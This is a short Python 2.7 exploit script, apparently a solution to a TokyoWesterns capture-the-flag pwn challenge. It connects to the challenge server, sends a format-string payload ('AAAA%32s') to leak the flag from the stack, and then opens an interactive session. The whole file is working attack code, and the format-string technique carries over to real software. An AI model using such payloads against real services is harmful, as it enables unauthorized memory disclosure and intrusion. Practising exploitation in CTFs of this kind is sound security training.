#!/usr/bin/env python2.7

import socket
import struct
import sys
import telnetlib

if len(sys.argv) == 3:
    ADDR = sys.argv[1]
    PORT = int(sys.argv[2])
else:
    ADDR = "pwn1.chal.ctf.westerns.tokyo"
    PORT = 31729

DBG = True

s = socket.create_connection((ADDR, PORT))

def p64(a):
    return struct.pack("<Q", a)

def u64(s):
    return struct.unpack("<Q", s)[0]

def p32(a):
    return struct.pack("<I", a)

def u32(s):
    return struct.unpack("<I", s)[0]

def rtil(st):
    buf = ""
    x = 0
    while True:
        curr = s.recv(1)
        if curr == "":
            break
        buf += curr
        if(curr == st[x]):
            x += 1
            if x == len(st):
                break
        else:
            x = 0
    if DBG:
        sys.stdout.write(buf)
        sys.stdout.flush()
    return buf

# address of flag is on the stack
rtil(">> ")
s.send("AAAA" + "%" + "32s\n")

t = telnetlib.Telnet()
t.sock = s
t.interact()
